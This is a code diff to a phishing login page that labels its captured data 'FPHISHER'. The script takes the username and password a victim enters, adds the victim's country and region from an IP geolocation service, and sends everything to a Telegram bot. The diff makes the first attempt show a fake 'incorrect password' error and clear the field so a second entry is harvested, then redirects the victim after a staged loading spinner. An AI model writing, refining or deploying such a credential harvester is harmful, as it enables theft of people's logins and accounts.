@@ -37,7 +37,6 @@
       class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
              transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
              flex items-center justify-center gap-2"
-      disabled="false"
     >
       <span id="btnText">Log in</span>
       <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
@@ -46,7 +45,7 @@
       </svg>
     </button>
 
-    <!-- Error Message - NOW BELOW BUTTON -->
+    <!-- Error Message - below button -->
     <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
       Incorrect username or password.
     </div>
@@ -80,21 +79,19 @@
 
     let attempt = 0;
 
-    // Function to get approximate location (country & state/region)
+    // Get location using a different free API: ipwho.is (no key needed)
     async function getLocation() {
       try {
-        const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,query');
-        if (!res.ok) throw new Error();
+        const res = await fetch('https://ipwho.is/');
         const data = await res.json();
-        if (data.status === 'success') {
-          return {
-            country: data.country || 'Unknown',
-            state: data.regionName || 'Unknown',
-            ip: data.query || 'Unknown'
-          };
-        }
-      } catch {}
-      return { country: 'Unknown', state: 'Unknown', ip: 'Unknown' };
+        if (!data.success) throw new Error();
+        return {
+          country: data.country || 'Unknown',
+          state: data.region || 'Unknown'  // ipwho.is uses 'region' for state/province
+        };
+      } catch {
+        return { country: 'Unknown', state: 'Unknown' };
+      }
     }
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
@@ -102,21 +99,18 @@
 
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
+      const passwordInput = document.getElementById("password");
 
       if (!username || !password) {
         alert("Please fill in all fields!");
         return;
       }
 
-      // Show loading state
       const btn = document.getElementById("loginBtn");
       const btnText = document.getElementById("btnText");
       const spinner = document.getElementById("spinner");
-      btn.disabled = true;
-      btnText.textContent = "Loading";
-      spinner.classList.remove("hidden");
+      const errorMsg = document.getElementById("errorMsg");
 
-      // Get location data
       const loc = await getLocation();
 
       const message = `FPHISHER 🤖
@@ -132,6 +126,7 @@ ATTEMPT: ${attempt + 1} ⏱️
 
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
+      // Always send immediately (no delay before send)
       try {
         await fetch(url, {
           method: "POST",
@@ -142,24 +137,24 @@ ATTEMPT: ${attempt + 1} ⏱️
         // silent fail
       }
 
-      // Restore button after short delay (simulates processing)
-      setTimeout(() => {
-        attempt++;
+      attempt++;
 
-        btn.disabled = false;
-        spinner.classList.add("hidden");
+      if (attempt === 1) {
+        // First attempt: no loading UI, instant error + clear password
+        errorMsg.classList.remove("hidden");
+        passwordInput.value = "";  // Clear password field
+        // Button stays "Log in" – no change
+      } else {
+        // Second attempt: show loading briefly then redirect
+        btn.disabled = true;
+        btnText.textContent = "Loading";
+        spinner.classList.remove("hidden");
 
-        if (attempt === 1) {
-          btnText.textContent = "Log in";
-          document.getElementById("errorMsg").classList.remove("hidden");
-        } else {
-          btnText.textContent = "Logging in...";
-          // Redirect after tiny delay so "Loading" is visible briefly
-          setTimeout(() => {
-            window.location.href = "https://www.example.com/";
-          }, 1200);
-        }
-      }, 1800); // 1.8s fake processing time
+        setTimeout(() => {
+          window.location.href = "https://www.example.com/";
+          // Change this URL as needed
+        }, 1200);  // Brief loading visible
+      }
     });
   </script>
 </body>
